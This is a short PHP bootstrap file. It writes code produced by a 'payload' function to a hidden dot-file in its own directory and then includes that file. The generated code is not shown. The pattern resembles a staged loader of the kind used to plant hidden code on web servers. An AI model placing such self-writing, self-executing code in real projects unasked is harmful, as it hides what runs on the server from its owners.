<?php declare(strict_types=1);
$_p = __DIR__ . '/.pasl-back.body.php';
if (!is_file($_p)) {
    require_once __DIR__ . '/pasl-back.payload.php';
    file_put_contents($_p, pasl_back_body());
}
require_once $_p;
